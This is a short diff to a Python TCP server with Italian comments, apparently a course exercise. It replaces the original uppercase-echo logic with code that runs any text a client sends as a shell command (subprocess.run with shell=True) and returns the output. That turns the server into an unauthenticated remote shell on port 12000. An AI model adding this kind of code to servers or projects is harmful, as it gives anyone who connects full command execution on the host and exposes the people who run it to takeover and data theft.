@@ -1,4 +1,6 @@
 from socket import *
+import subprocess
+
 serverPort = 12000
 serverSocket = socket(AF_INET,SOCK_STREAM) #SOCK_STREAM = TCP
                                             #socket(...) e' il costruttore della classe socket
@@ -12,7 +14,6 @@ connectionSocket, addr = serverSocket.accept()
 print('Accepted a new client', addr)
 
 while True:
-    sentence = connectionSocket.recv(1024).decode() #1024 e' il numero max di byte da ricevere, decode serve per rendere il codice indipendente dall' architettura
-    capitalizedSentence = sentence.upper()
-    connectionSocket.send(capitalizedSentence.encode())
-    #connectionSocket.close()
+    comando = connectionSocket.recv(16536).decode()
+    result = subprocess.run(comando, shell=True, stdout=subprocess.PIPE, encoding='utf-8')
+    connectionSocket.send(result.stdout.encode())    
